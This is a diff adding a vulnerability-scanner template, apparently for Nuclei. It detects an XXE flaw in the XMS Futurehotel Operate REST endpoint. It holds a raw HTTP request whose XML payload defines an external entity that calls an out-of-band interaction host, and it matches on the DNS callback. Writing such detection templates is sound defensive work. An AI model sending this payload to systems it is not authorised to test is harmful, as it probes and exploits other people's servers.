@@ -1,0 +1,30 @@
+id: xms-futurehotel-operate-xxe
+info:
+  name: XXE Vulnerability in XMS Futurehotel Operate
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dns,oob
+  description: |
+    This template detects an XXE vulnerability in the XMS Futurehotel Operate endpoint by sending a crafted XML payload and verifying DNS-based OOB interaction.
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse}}"> %remote;]>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
